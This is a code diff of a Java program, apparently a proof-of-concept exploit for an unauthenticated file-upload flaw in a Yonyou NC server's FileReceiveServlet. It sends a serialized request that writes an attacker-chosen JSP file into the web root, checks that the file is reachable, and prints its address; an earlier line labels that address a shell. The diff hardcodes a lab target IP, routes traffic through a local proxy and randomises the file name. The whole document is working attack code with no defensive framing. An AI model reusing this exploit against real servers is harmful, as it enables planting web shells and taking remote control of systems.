@@ -34,13 +34,23 @@ public class Yongyou_upload {
     public static void main(String[] args) throws Exception {
         BufferedReader reader;
         StringBuffer response;
+
+        String proxyHost = "127.0.0.1";
+        int proxyPort = 8080;
+        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
+
+        String name = "1.jsp";
+        String filepath = "c:/1.txt";
+        String filename1 = generateRandomString(6)+name;
         String path="/servlet/FileReceiveServlet";
         Map<String, Object> metaInfo = new HashMap<String, Object>();
         metaInfo.put("TARGET_FILE_PATH", "webapps/nc_web");
-        metaInfo.put("FILE_NAME", "sectest666.jsp");
-        String uri=args[0];
+        metaInfo.put("FILE_NAME", filename1);
+
+        String uri="http://192.168.29.130:8081";
         URL url = new URL(uri+path);
-        HttpURLConnection httpUrlConn = (HttpURLConnection)url.openConnection();
+        System.out.println(uri);
+        HttpURLConnection httpUrlConn = (HttpURLConnection)url.openConnection(proxy);
         httpUrlConn.setRequestProperty("Content-Type","application/x-java-serialized-object");
         httpUrlConn.setDoOutput(true);
         httpUrlConn.setDoInput(true);
@@ -51,7 +61,7 @@ public class Yongyou_upload {
         OutputStream out = httpUrlConn.getOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(out);
         oos.writeObject(metaInfo);
-        File file = new File(args[1]);
+        File file = new File(filepath);
         Long filelength = file.length();
         byte[] filecontent = new byte[filelength.intValue()];
         try {
@@ -75,14 +85,28 @@ public class Yongyou_upload {
         } catch(IOException e) {
             e.printStackTrace();
         }
-        URL httpUrl = new URL(uri+"/test.jsp");
-        HttpURLConnection httpURLConnection = (HttpURLConnection) httpUrl.openConnection();
+        URL httpUrl = new URL(uri+"/"+filename1);
+        HttpURLConnection httpURLConnection = (HttpURLConnection) httpUrl.openConnection(proxy);
         httpURLConnection.setReadTimeout(50000);
         httpURLConnection.setRequestMethod("GET");
         if(httpURLConnection.getResponseCode()==200){
-            System.out.println("shell 地址:\n"+uri+"/test.jsp");
+            System.out.println("文件地址 地址:\n"+uri+"/"+filename1);
         }
     }
+
+    public static String generateRandomString(int length) {
+        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+        Random random = new Random();
+        StringBuilder sb = new StringBuilder(length);
+
+        for (int i = 0; i < length; i++) {
+            int index = random.nextInt(characters.length());
+            sb.append(characters.charAt(index));
+        }
+        return sb.toString();
+    }
+}
+
 ```
 
 
